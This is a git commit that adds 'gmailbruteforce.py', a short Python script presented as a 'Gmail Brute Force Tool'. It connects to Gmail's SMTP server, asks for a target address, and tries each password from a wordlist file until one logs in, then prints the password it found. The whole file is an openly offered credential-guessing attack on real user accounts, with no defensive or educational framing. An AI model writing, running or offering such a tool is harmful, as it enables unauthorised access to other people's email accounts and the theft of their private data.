a0e4abc3abf724efa2dfc8ed7185e4923d1038d8
WA3tE4† <123822095+WA3tE4@users.noreply.github.com>
2026-06-23 15:41:38 -0300

    Main

---
+++ gmailbruteforce.py
@@ -0,0 +1,38 @@
+import smtplib
+from os import system
+def artwork():
+    
+    print("\n")
+
+    print("Welcome! This is a Gmail Brute Force Tool")
+
+artwork()
+
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+smtpserver.ehlo()
+smtpserver.starttls()
+
+user = input("Enter The Target Gmail Adress => ")
+
+print("\n")
+
+pwd = input("Enter '0' to use the inbuilt passwords list \nEnter '2' to add a custom password list\n => ")
+
+if pwd=='0':
+    passswfile="Passwords.txt"
+
+else :
+    print("\n")
+    passswfile = input("Name The File Path (For Password List) => ")
+
+passswfile = open(passswfile, "r")
+
+for password in passswfile:
+    try:
+        smtpserver.login(user, password)
+
+        print("[+] Password Found %s" % password)
+        break
+
+    except smtplib.SMTPAuthenticationError:
+        print("[!] Password Is Wrong. %s " % password)
